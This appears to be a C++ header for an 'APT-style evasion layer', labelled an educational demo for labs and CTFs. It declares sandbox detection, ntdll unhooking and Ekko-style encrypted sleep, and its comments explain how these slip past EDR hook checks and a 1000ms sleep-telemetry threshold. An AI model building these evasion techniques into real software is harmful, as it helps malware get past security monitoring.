// APT-style evasion layer - educational demo
// For authorized labs / CTF only.
#pragma once
#include <windows.h>
#include <cstddef>

namespace ev {

// environmental checks; returns true if a sandbox is suspected
bool is_sandbox();

// restore any modified bytes in ntdll's .text from a pristine KnownDlls
// copy. OPT-IN (ENABLE_NTDLL_UNHOOK): hook self-checking EDRs flag removed
// hooks, so the default build never calls this - the syscall layer reads
// SSNs from a clean copy without writing to ntdll.
bool unhook_ntdll();

// jittered sleep; working data is encrypted while resting (Ekko-style).
// Waits are chunked below the 1s long-sleep heuristic of sleep-hook
// telemetry (StackSentry emits sleep events only for waits >= 1000ms).
void obfuscate_sleep(DWORD ms, void* buf, size_t size);

}
